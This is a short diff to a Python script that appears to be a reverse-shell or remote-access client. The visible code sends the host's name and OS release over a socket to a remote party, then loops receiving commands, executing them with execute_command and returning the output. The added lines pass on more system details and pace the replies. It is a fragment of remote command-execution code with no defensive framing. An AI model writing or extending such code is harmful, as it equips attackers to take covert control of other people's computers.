@@ -28,6 +28,7 @@ node     \t{platform.node()}
 '''
     try:
         s.send(init.encode())
+        s.send(platform.release().encode())
     except socket.error:
         pass
 
@@ -60,6 +61,7 @@ def main():
             while True:
                 cmd = s.recv(1024).decode()
                 output = execute_command(cmd.strip())
+                time.sleep(0.3)
                 s.send(output.encode())
                 if cmd == "/21" or cmd == '':
                     raise socket.error
